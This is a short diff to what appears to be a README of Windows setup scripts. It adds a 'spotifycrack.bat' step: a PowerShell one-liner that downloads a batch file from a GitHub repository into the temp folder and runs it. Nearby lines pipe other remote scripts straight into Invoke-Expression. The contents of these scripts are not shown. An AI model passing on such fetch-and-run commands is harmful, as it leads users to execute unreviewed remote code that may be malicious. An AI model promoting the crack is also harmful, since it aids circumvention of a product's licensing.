@@ -57,4 +57,8 @@ irm https://raw.githubusercontent.com/archlinux-dev/win10/main/powertoys.ps1 | i
 irm https://raw.githubusercontent.com/archlinux-dev/win10/main/wingetui.ps1 | iex
 ```
 
+# spotifycrack.bat
+```powershell
+{ $t="$env:TEMP\s.bat"; irm https://raw.githubusercontent.com/archlinux-dev/win10/main/spotifycrack.bat -OutFile $t; start cmd "/c `"$t`"" }
+```
 ## Also feel free to comment and tell us what to add next!
